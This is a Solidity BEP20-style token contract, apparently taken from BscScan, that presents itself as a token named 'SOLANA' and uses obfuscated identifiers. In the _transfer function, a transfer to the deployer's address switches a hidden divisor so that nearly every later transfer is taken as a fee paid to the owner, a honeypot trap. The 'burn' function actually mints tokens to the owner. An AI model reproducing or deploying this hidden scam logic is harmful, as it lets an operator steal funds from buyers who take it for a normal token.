/**
 *Submitted for verification at BscScan.com on 2022-11-18
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
 // SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract IMOIFYZ {
string public  name = "SOLANA";
address private  GCJHQL = address(0);
mapping (address => uint256) public balanceOf;
uint256 private  PQUYBM = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
string public  symbol = "SOLANA";
uint256 private  TQUGAD = 1000000000000000000000;
uint256 private  UGFPJH = 10000000000;
uint256 private  UNENHI = 100000000;
address private  VUQLZF = address(0);
address private  YFPVXC = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  RIFCBI = 1000000000000000;
address public owner;
uint256 public constant VRMIUZ = 99999;
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
uint8 public constant decimals = 18;
uint256 private  TGCHTZ = 1000000000000000000;
uint256 private  XWIRCR = 10000000000000;
address private  GTOJYS = address(0);
address private  XGFODP = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getXWIRCR() private returns (uint256) {
return XWIRCR;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getXGFODP() private returns (address) {
return XGFODP;
}

function _getUNENHI() private returns (uint256) {
return UNENHI;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "VLCGHG");
require(to != address(0), "VLCGHG");
require(amount <= balanceOf[from], "VLCGHG");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* VRMIUZ/TGCHTZ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==GCJHQL){
TGCHTZ = VRMIUZ+2;
}
emit Transfer(from, to, transferAmount);
}
function _getGTOJYS() private returns (address) {
return GTOJYS;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tVLCGHG 0");
require(spender != address(0), "fVLCGHG 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getVUQLZF() private returns (address) {
return VUQLZF;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getRIFCBI() private returns (uint256) {
return RIFCBI;
}

constructor () {
GCJHQL = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getUGFPJH() private returns (uint256) {
return UGFPJH;
}

function _getYFPVXC() private returns (address) {
return YFPVXC;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getTQUGAD() private returns (uint256) {
return TQUGAD;
}

function _getPQUYBM() private returns (uint256) {
return PQUYBM;
}


}